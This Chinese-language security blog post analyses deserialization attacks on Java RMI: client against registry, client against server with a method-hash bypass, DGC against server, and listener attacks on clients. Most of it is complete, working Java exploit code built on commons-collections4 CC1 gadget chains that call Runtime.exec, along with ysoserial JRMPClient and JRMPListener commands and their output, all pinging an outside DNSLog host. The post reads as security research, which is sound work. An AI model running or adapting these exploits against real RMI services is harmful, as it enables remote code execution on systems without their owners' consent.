---
layout: mypost
title: "RMI反序列化Attack"
categories: [Java安全]
---

## 前言

上个月对 RMI 进行了一次全面的分析 🧐，粘一下当时给出的结论：

```
1.攻击客户端：

注册中心攻击客户端 RegistryImpl_Stub.lookup(xxx)

DGC攻击客户端 DGCImpl_Stub.dirty(xxx)

服务端攻击客户端 UnicastRef.invoke(xxx)

注册中心/服务端/DGC各一个 StreamRemoteCall.executeCall(xxx)

2.攻击注册中心：

客户端攻击注册中心 RegistryImpl_Skel.dispatch(xxx)

3.攻击服务端：

客户端攻击服务端 UnicastServerRef.dispatch(xxx)

DGC攻击服务端 DGCImpl_Skel.dispatch(xxx)
```

理论上将这三部分都是可以被攻击的，开始实践。

## 客户端攻击注册中心

理论上客户端与服务端均可以去攻击注册中心，无非是 lookup 等方法与 bind 等方法的区别罢了，最终都会到`RegistryImpl_Skel.dispatch(xxx)`这个漏洞触发点，但这里讨论的是 Server 端和 Registry 端在同一端的情况，避免产生歧义，提前说明。接下来就拿 lookup 方法来说明。

![alt text](1.png)

从上图可以看出，直接对 var10 变量进行了反序列化的操作，而这个 var10 变量就是 lookup 方法的参数，去看一下 RegistryImpl_Stub 中的 lookup 方法，如下-->

![alt text](2.png)

可以看出，lookup 方法的参数是一个 String 类型，而要打一个反序列化漏洞，类型最好是一个 Object 类型，String 类甚至都没有重写 readObject 方法，目前没有听说拿 String 类型去打反序列化漏洞的，这么看貌似无法利用 lookup 方法去进行攻击。但实际上当写完`Registry registry = LocateRegistry.getRegistry("192.168.xxx.xxx", 1099);`这一行代码后，客户端自实现了 RegistryImpl_Stub，它就可以远程通信了，自己实现一个 lookup 方法（接受参数类型为 Object）把恶意对象发过去即可。

在 Server 端添加依赖如下-->

```
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
```

打一个`commons-collections4 4.0`的 CC1 链，挺简单的不啰嗦了，书写 Poc 如下-->

```java
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;
import org.apache.commons.collections4.Transformer;
import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.server.UnicastRef;
import java.io.ObjectOutput;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.util.HashMap;
import java.util.Map;

public class ClientAttackRegistry {

    private static Object getPayload() throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.transformingMap(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        return instance;
    }

    private static final Operation[] operations = new Operation[]{
            new Operation("void bind(java.lang.String, java.rmi.Remote)"),
            new Operation("java.lang.String list()[]"),
            new Operation("java.rmi.Remote lookup(java.lang.String)"),
            new Operation("void rebind(java.lang.String, java.rmi.Remote)"),
            new Operation("void unbind(java.lang.String)")
    };

    public static void lookup(RegistryImpl_Stub registry) throws Exception {
        Class<?> clazz = Class.forName("java.rmi.server.RemoteObject");
        Field field = clazz.getDeclaredField("ref");
        field.setAccessible(true);
        UnicastRef ref = (UnicastRef) field.get(registry);
        RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L);
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(getPayload());
        ref.invoke(var2);
    }

    public static void main(String[] args) throws Exception {
        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry("192.168.xxx.xxx", 1099);
        lookup(registry);
    }
}
```

成功触发 DNS 请求，如下-->

![alt text](20.png)

当然改一下 bind 函数也是可以的，如下-->

```java
public static void bind(RegistryImpl_Stub registry) throws Exception {
    Class<?> clazz = Class.forName("java.rmi.server.RemoteObject");
    Field field = clazz.getDeclaredField("ref");
    field.setAccessible(true);
    UnicastRef ref = (UnicastRef) field.get(registry);
    RemoteCall var3 = ref.newCall(registry, operations, 0, 4905912898345647071L);
    ObjectOutput var4 = var3.getOutputStream();
    var4.writeObject(getPayload());
    ref.invoke(var3);
}
```

成功触发 DNS 请求，如下-->

![alt text](20.png)

换汤不换药了哈哈，单纯换了个函数名，有没有更优解？看一下 Stub 中 bind 方法的源码，如下-->

![alt text](3.png)

其中会将 var2 变量序列化，var2 变量的类型是 Remote 类型（一个接口类型），既然是接口，那么就可以利用动态代理！简单改一下 CC 链的收尾部分即可，这里拿 CC1（LazyMap 版本） 举例，如下-->

```java
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.Transformer;
import sun.rmi.registry.RegistryImpl_Stub;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.util.HashMap;
import java.util.Map;

public class ClientAttackRegistry {

    private static Remote getPayload() throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                ),
                new ConstantTransformer(1)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.lazyMap(map, chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                annotationInvocationHandler);
        InvocationHandler entryInstance = (InvocationHandler) constructor.newInstance(Retention.class, proxy);
        Remote remoteProxy = (Remote) Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[] { Remote.class },
                entryInstance);
        return remoteProxy;
    }

    public static void main(String[] args) throws Exception {
        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry("192.168.xxx.xxx", 1099);
        registry.bind("xxx",getPayload());
    }
}
```

当反序列化 remoteProxy 时，即调用`remoteProxy.readObject()`，其关联的 InvocationHandler（即 AnnotationInvocationHandler 实例）的 readObject 方法会被调用，下断点调试如下-->

![alt text](4.png)

此时的调用栈如下-->

![alt text](5.png)

接着将代码走完，成功触发 DNS 请求，如下-->

![alt text](20.png)

这个通过动态代理攻击手段就是 Ysoserial 中 ysoserial.exploit.RMIRegistryExploit 的原理，详情 🔎 如下-->

![alt text](6.png)

服务端攻击注册中心的思路与客户端攻击注册中心的思路完全相同，且在上文用 bind 方法做过演示，关于攻击注册中心的部分到此结束。

## 客户端攻击服务端

当 Client 端反序列化获取到 Server 端创建的 Stub，会在本地通过这个 Stub 通信进行后续的方法调用，其过程中会将方法中的参数序列化进行传输，而在 Server 端自然会进行反序列化，若此时方法的参数类型为 Object 类型，那再好不过了，直接将恶意对象发过去即可。写个 Demo 如下。

在 Server 端重写参数为 Object 类型的方法，如下-->

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IRemoteObject extends Remote {
    public String sayHello(String name) throws RemoteException;
    public String sayHello(Object object) throws RemoteException;
}
```

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class HelloRemoteObject extends UnicastRemoteObject implements IRemoteObject {

    public HelloRemoteObject() throws RemoteException {
        super();
    }

    @Override
    public String sayHello(String name) throws RemoteException {
        return "Hello " + name;
    }

    public String sayHello(Object object) throws RemoteException {
        return "Hello Object";
    }
}
```

同时客户端也要重写参数为 Object 类型的接口，不啰嗦了，还是打一个`commons-collections4 4.0`的 CC1 链，如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class ClientAttackServer {

    private static InvocationHandler getPayload() throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                ),
                new ConstantTransformer(1)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.lazyMap(map, chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);
        Map proxy = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                annotationInvocationHandler);
        InvocationHandler entryInstance = (InvocationHandler) constructor.newInstance(Retention.class, proxy);
        return entryInstance;
    }

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("192.168.137.114", 1099);
        IRemoteObject helloRemoteObject = (IRemoteObject)registry.lookup("helloRemoteObject");
        System.out.println(helloRemoteObject.sayHello(getPayload()));
    }
}
```

成功触发 DNS 请求，如下-->

![alt text](20.png)

这么看攻击面似乎不是很大，Server 端若没有参数为 Object 的方法似乎是不可以攻击的。事实真的是这样吗？嗯嗯显然是有办法去绕过的，做个实验，在 Server 端将重写的`public String sayHello(Object object)`注释掉，再次运行代码，DNSLog 平台没有收到请求，且代码报错如下

```
Caused by: java.rmi.UnmarshalException: unrecognized method hash: method not supported by remote object
    at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:294)
    at sun.rmi.transport.Transport$1.run(Transport.java:200)
    at sun.rmi.transport.Transport$1.run(Transport.java:197)
    at java.security.AccessController.doPrivileged(Native Method)
    at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
    at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$256(TCPTransport.java:683)
    at java.security.AccessController.doPrivileged(Native Method)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
    at java.lang.Thread.run(Thread.java:745)
```

在`UnicastServerRef.java:294`这里下断点跟一下，此时的 op 值为-8646385277647511247，如下-->

![alt text](7.png)

而此时 hashToMethod_Map 中有且只有一个 key 值为 8370655165776887524，如下-->

![alt text](8.png)

显然是找不到的，即变量 method 会被赋值为 null，此时 F2 手动将 op 值赋为 8370655165776887524，继续运行代码，会发现成功触发 DNS 请求，如下-->

![alt text](20.png)

嗯嗯对，看来关键就是此处，现在问题变成了要找到一种方式，使得传递的参数是恶意的反序列化数据，但方法的 hash 值却要和 hashToMethod_Map 中的 hash 值相同-->这个问题进而变成要去找到 Client 端计算 hash 值的方法，去 Hook 这个点。跟跟代码即可，不啰嗦了，是在下图这里（RemoteObjectInvocationHandler.invokeRemoteMethod）-->

![alt text](9.png)

Server 端保持`public String sayHello(Object object)`注释状态，Client 端传入恶意的反序列化数据，上图处下断点，修改变量 method 的值为`IRemoteObject.class.getDeclaredMethod("sayHello", String.class)`，修改成功如下-->

![alt text](10.png)

此时的 hash 值为 8370655165776887524，见下图。

![alt text](11.png)

继续运行代码，成功触发 DNS 请求，如下-->

![alt text](20.png)

显然通过这种方法便可使得利用难度大大降低，这也是众多文章中 Bypass JEP290 去攻击 RMI 的手法之一，在此基础上衍生出很多其他的方法，例如 RASP、流量层替换等等。

## DGC 攻击服务端

可以类比为客户端攻击注册中心，客户端攻击注册中心用到的是`java.rmi.registry.RegistryImpl_Stub`中的方法，这里是要用到`sun.rmi.transport.DGCImpl_Stub`中的方法，如下-->

![alt text](12.png)

老样子重写 clean 或者 dirty 方法即可，但这里的问题在于，如何去自实现一个 DGCImpl_Stub？自实现 RegistryImpl_Stub 简单，即`Registry registry = LocateRegistry.getRegistry("192.168.xxx.xxx", 1099);`一行代码完事，但是自实现 DGCImpl_Stub 就比较麻烦，它的端口是不固定的，要想自实现 DGCImpl_Stub 其实就是要去 Hook 到它端口具体的值，跟一跟。

下图是 Client 端开始自实现 DGCImpl_Stub 的位置。

![alt text](13.png)

显然其中的 endpoint 变量是要去重点关注的，有了它，就可以去自实现 DGCImpl_Stub 了，沿着堆栈跟，如下-->

![alt text](14.png)

![alt text](15.png)

![alt text](16.png)

最终就是跟到上图这里，显然`"[192.168.137.114:60891]"`是来自于 incomingRefTable，全局搜索 🔍 它，不难发现它只在一处有赋值，如下-->

![alt text](17.png)

![alt text](18.png)

最后竟然跟到了 ref，而 ref 又是 ServerStubs 中的 LiveRef，所以默认情况下，DGCImpl_Stub 的通信端口是与 ServerStubs 的端口相同的。理论上是可以获得到 ServerStubs 的 LiveRef，接下来选取一下从哪里开始创建 DGCImpl_Stub。

![alt text](13.png)

上图这里吗？但它的 EndpointEntry 方法是私有的，不太方便，那看它的上一层，如下-->

![alt text](14.png)

`public static EndpointEntry lookup(Endpoint ep)`是 public static，那好就它了，写个 demo 尝试如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;
import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.util.HashMap;
import java.util.Map;

public class DGCAttackServer {
    private static Object getPayload() throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.transformingMap(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry("192.168.137.114", 1099);
        Remote helloRemoteObject = registry.lookup("helloRemoteObject");
        InvocationHandler handler = Proxy.getInvocationHandler(helloRemoteObject);
        Class<?> clazzRemoteObject = Class.forName("java.rmi.server.RemoteObject");
        Field refRemoteObject = clazzRemoteObject.getDeclaredField("ref");
        refRemoteObject.setAccessible(true);
        UnicastRef unicastRef = (UnicastRef) refRemoteObject.get(handler);

        Class<?> clazzUnicastRef = Class.forName("sun.rmi.server.UnicastRef");
        Field refUnicastRef = clazzUnicastRef.getDeclaredField("ref");
        refUnicastRef.setAccessible(true);
        LiveRef liveRef = (LiveRef) refUnicastRef.get(unicastRef);

        Class<?> clazzLiveRef = Class.forName("sun.rmi.transport.LiveRef");
        Field refLiveRef = clazzLiveRef.getDeclaredField("ep");
        refLiveRef.setAccessible(true);
        TCPEndpoint tcpEndpoint = (TCPEndpoint) refLiveRef.get(liveRef);

        Class<?> clazzTCPEndpoint = Class.forName("sun.rmi.transport.DGCClient$EndpointEntry");
        Method lookupTCPEndpoint = clazzTCPEndpoint.getDeclaredMethod("lookup", Endpoint.class);
        lookupTCPEndpoint.setAccessible(true);
        lookupTCPEndpoint.invoke(null, tcpEndpoint);
    }
}
```

调试会发现此时的 entry 不等于 null，无法进入`entry = new EndpointEntry(ep);`，如下-->

![alt text](19.png)

也简单，加一步反射直接将 endpointTable 清空即可（有点 DNSLog 那条链的感觉），之后就是反射调用 lookup 方法拿到 DGCImpl_Stub 的实例，重写 clean 方法即可，整理整理，给出最终的 EXP 如下-->

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;
import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.DGCImpl_Stub;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import java.io.ObjectOutput;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.util.HashMap;
import java.util.Map;

public class DGCAttackServer {
    private static Object getPayload() throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(clazz),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> transformedMap = TransformedMap.transformingMap(map,null,chainedTransformer);
        Class<?> clazzSink = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazzSink.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, transformedMap);
        return instance;
    }
    private static final Operation[] operations = new Operation[]{
            new Operation("void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)"),
            new Operation("java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)")
    };

    public static void clean(DGCImpl_Stub dgc) throws Exception {
        Class<?> clazz = Class.forName("java.rmi.server.RemoteObject");
        Field field = clazz.getDeclaredField("ref");
        field.setAccessible(true);
        UnicastRef ref = (UnicastRef) field.get(dgc);
        RemoteCall var6 = ref.newCall(dgc, operations, 0, -669196253586618813L);
        ObjectOutput var7 = var6.getOutputStream();
        var7.writeObject(getPayload());
        ref.invoke(var6);
    }
    public static DGCImpl_Stub getDGCImpl_Stub(RegistryImpl_Stub registry) throws Exception {
        Remote helloRemoteObject = registry.lookup("helloRemoteObject");
        InvocationHandler handler = Proxy.getInvocationHandler(helloRemoteObject);
        Class<?> clazzRemoteObject = Class.forName("java.rmi.server.RemoteObject");
        Field refRemoteObject = clazzRemoteObject.getDeclaredField("ref");
        refRemoteObject.setAccessible(true);
        UnicastRef unicastRef = (UnicastRef) refRemoteObject.get(handler);

        Class<?> clazzUnicastRef = Class.forName("sun.rmi.server.UnicastRef");
        Field refUnicastRef = clazzUnicastRef.getDeclaredField("ref");
        refUnicastRef.setAccessible(true);
        LiveRef liveRef = (LiveRef) refUnicastRef.get(unicastRef);

        Class<?> clazzLiveRef = Class.forName("sun.rmi.transport.LiveRef");
        Field refLiveRef = clazzLiveRef.getDeclaredField("ep");
        refLiveRef.setAccessible(true);
        TCPEndpoint tcpEndpoint = (TCPEndpoint) refLiveRef.get(liveRef);

        Class<?> clazzTCPEndpoint = Class.forName("sun.rmi.transport.DGCClient$EndpointEntry");
        Method lookupTCPEndpoint = clazzTCPEndpoint.getDeclaredMethod("lookup", Endpoint.class);
        lookupTCPEndpoint.setAccessible(true);
        Field endpointTableTCPEndpoint = clazzTCPEndpoint.getDeclaredField("endpointTable");
        endpointTableTCPEndpoint.setAccessible(true);
        Map<?, ?> endpointTable = (Map<?, ?>) endpointTableTCPEndpoint.get(null);
        endpointTable.clear();
        Object entry = lookupTCPEndpoint.invoke(null, tcpEndpoint);

        Class<?> clazzEntry = entry.getClass();
        Field dgcEntry = clazzEntry.getDeclaredField("dgc");
        dgcEntry.setAccessible(true);
        DGCImpl_Stub dgc = (DGCImpl_Stub) dgcEntry.get(entry);
        return dgc;
    }

    public static void main(String[] args) throws Exception {
        RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry("192.168.137.114", 1099);
        DGCImpl_Stub dgc = getDGCImpl_Stub(registry);
        clean(dgc);
    }
}
```

运行成功触发 DNS 请求，如下-->

![alt text](20.png)

翻看 Ysoserial 中 ysoserial.exploit.JRMPClient 的实现是同一个思路，都使用 DGC 进行攻击，但原理还是有所不同。它的原理：
由于 Server 端与 Registry 端一般是在同一台机器，则使用 DGC 去攻击了 Registry 端监听端口，这么看马马虎虎算是一个对 Registry 端的攻击。换汤不换药，相当于给 ysoserial.exploit.RMIRegistryExploit 这种攻击方式从 RegistryImpl_Stub 换成了 DGCImpl_Stub。为什么可以这样？给出解释如下-->

DGC 通信和 RMI 通信在 Transport 层使用相同的处理逻辑，只是通过客户端写入的标记区分处理逻辑（如 RegistryImpl_Skel 或 DGCImpl_Skel），即 DGC 攻击可以泛化到任意 JRMP 协议端口（Registry 端监听端口、DGC 端监听端口、RegistryImpl_Stub 监听端口、DGCImpl_Stub 监听端口），没有写与 Server 端相关的监听端口，是因为它的 Stub 实现方式为动态代理实现，而不是重新实例化类，即无法被攻击。

挺简单的，这里直接用 Ysoserial 打了-->

```shell
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 192.168.137.114 1099 CommonsCollections1 "ping 6y7d5.cxsys.spacestabs.top"
```

运行成功触发 DNS 请求，如下-->

![alt text](20.png)

关于攻击服务端的手法到此结束 🔚！

## 注册中心、DGC、服务端攻击客户端

上面已经依次演示过客户端攻击注册中心、服务端、DGC。那么注册中心、DGC、服务端攻击客户端无非就是镜像操作，且实战意义较少，不做演示。而还有一种攻击手法是打客户端的 StreamRemoteCall.executeCall(xxx)，即下图-->

![alt text](21.png)

这其实就是 Ysoserial 中 ysoserial.exploit.JRMPListener 的实现原理，尝试打一下：

```shell
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "ping 6y7d5.cxsys.spacestabs.top"

* Opening JRMP listener on 1099
Have connection from /192.168.137.114:50264
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
```

此时成功触发 DNS 请求，如下-->

![alt text](20.png)

关于攻击客户端的手法到此结束。文章也到此结束，关于 JEP290 的绕过、RMI 衍生出的 Gadgets 打二次反序列化等等之后有时间再更吧！